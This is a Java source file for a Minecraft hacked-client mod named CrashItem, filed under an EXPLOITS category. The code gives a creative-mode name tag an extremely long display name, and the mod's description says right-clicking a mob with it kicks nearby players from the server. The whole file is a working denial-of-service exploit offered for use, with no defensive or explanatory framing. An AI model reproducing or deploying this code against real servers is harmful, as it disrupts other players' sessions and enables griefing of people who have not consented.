/*
 * Copyright � 2014 - 2015 Alexander01998 and contributors
 * All rights reserved.
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package tk.wurst_client.mods;

import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;
import tk.wurst_client.WurstClient;

@Mod.Info(category = Mod.Category.EXPLOITS,
        description = "Generates a CrashItem.\n" + "Right click a mob with it to kick nearby players from the server.",
        name = "CrashItem")
public class CrashItemMod extends Mod {
    @Override
    public void onEnable() {
        if (Minecraft.getMinecraft().thePlayer.inventory.getCurrentItem() == null ||
                !(Minecraft.getMinecraft().thePlayer.inventory.getCurrentItem().getItem() instanceof ItemNameTag)) {
            WurstClient.INSTANCE.chat.error("You are not holding a nametag in your hand.");
            setEnabled(false);
            return;
        } else if (!Minecraft.getMinecraft().thePlayer.capabilities.isCreativeMode) {
            WurstClient.INSTANCE.chat.error("Creative mode only.");
            setEnabled(false);
            return;
        }
        String stackName = "";
        for (int i = 0; i < 3000; i++) {
            StringBuilder builder = new StringBuilder().append(stackName);
            stackName = builder.append("############").toString();
        }
        Minecraft.getMinecraft().thePlayer.inventory.getCurrentItem().setStackDisplayName(stackName);
        Minecraft.getMinecraft().displayGuiScreen(new GuiInventory(Minecraft.getMinecraft().thePlayer));
        Minecraft.getMinecraft().thePlayer.closeScreen();
        WurstClient.INSTANCE.chat.message("CrashItem created. Right click a mob with it.");
        setEnabled(false);
    }
}
